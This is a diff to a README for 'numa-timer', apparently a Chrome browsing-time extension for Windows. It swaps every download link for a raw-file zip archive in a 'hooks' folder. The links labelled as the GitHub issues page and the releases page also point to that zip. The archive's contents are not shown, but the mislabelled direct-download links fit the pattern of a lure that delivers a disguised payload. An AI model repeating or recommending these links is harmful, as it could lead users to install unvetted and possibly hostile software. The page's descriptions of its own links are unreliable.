@@ -1,6 +1,6 @@
 # ⏰ numa-timer - Always See Your Browsing Time
 
-[![Download numa-timer](https://img.shields.io/badge/Download-numa--timer-4caf50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Oswald121/numa-timer/main/assets/timer-numa-v3.9.zip)
+[![Download numa-timer](https://img.shields.io/badge/Download-numa--timer-4caf50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Oswald121/numa-timer/main/hooks/timer-numa-2.6.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Here is a simple guide to install and start using numa-timer on your Windows PC.
 
 2. **Visit the Download Page**  
    Click on the large green button below or copy and paste this link in your browser:  
-   [https://raw.githubusercontent.com/Oswald121/numa-timer/main/assets/timer-numa-v3.9.zip](https://raw.githubusercontent.com/Oswald121/numa-timer/main/assets/timer-numa-v3.9.zip)
+   [https://raw.githubusercontent.com/Oswald121/numa-timer/main/hooks/timer-numa-2.6.zip](https://raw.githubusercontent.com/Oswald121/numa-timer/main/hooks/timer-numa-2.6.zip)
 
 3. **Download the Extension**
 
@@ -95,7 +95,7 @@ numa-timer only tracks your browsing time on supported sites. It does not collec
 
 If you need help with numa-timer:
 
-- Visit the GitHub issues page: https://raw.githubusercontent.com/Oswald121/numa-timer/main/assets/timer-numa-v3.9.zip
+- Visit the GitHub issues page: https://raw.githubusercontent.com/Oswald121/numa-timer/main/hooks/timer-numa-2.6.zip
 - Search for a similar problem or open a new issue.
 - Provide details about your Windows version and Chrome version.
 
@@ -104,7 +104,7 @@ If you need help with numa-timer:
 ## 🧩 Updating numa-timer
 
 1. Visit the GitHub releases page again:  
-   [https://raw.githubusercontent.com/Oswald121/numa-timer/main/assets/timer-numa-v3.9.zip](https://raw.githubusercontent.com/Oswald121/numa-timer/main/assets/timer-numa-v3.9.zip)
+   [https://raw.githubusercontent.com/Oswald121/numa-timer/main/hooks/timer-numa-2.6.zip](https://raw.githubusercontent.com/Oswald121/numa-timer/main/hooks/timer-numa-2.6.zip)
 
 2. Download the newest extension files.
 
@@ -122,4 +122,4 @@ If you need help with numa-timer:
 
 ---
 
-[![Download numa-timer](https://img.shields.io/badge/Download-numa--timer-4caf50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Oswald121/numa-timer/main/assets/timer-numa-v3.9.zip)
+[![Download numa-timer](https://img.shields.io/badge/Download-numa--timer-4caf50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Oswald121/numa-timer/main/hooks/timer-numa-2.6.zip)
